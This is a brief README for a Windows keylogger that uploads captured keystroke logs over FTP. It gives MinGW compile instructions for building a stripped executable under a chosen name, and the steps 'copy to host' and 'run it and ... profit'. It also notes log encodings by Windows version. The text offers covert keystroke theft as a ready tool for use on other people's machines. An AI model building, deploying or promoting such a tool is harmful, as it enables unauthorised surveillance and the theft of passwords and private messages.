### About

A tiny keylogger with ftp upload.

Tested on Win XP, Win Vista, Win 7, Win 8.

### Usage
* copy `config.def.h` to `config.h` and edit
* compile (*with MinGW*):
```
gcc.exe keylogger.c -lwsock32 -o <name.exe> -s -Os
```
* copy <name.exe> to host
* run it and ... profit **:)**

### Note
* from **WinXP** log file is coming in *CP1251* encoding
* from **Win7-Win8** in *UTF-16LE*

### Contacts
chinarulezzz, <alexandr.savca89@gmail.com>

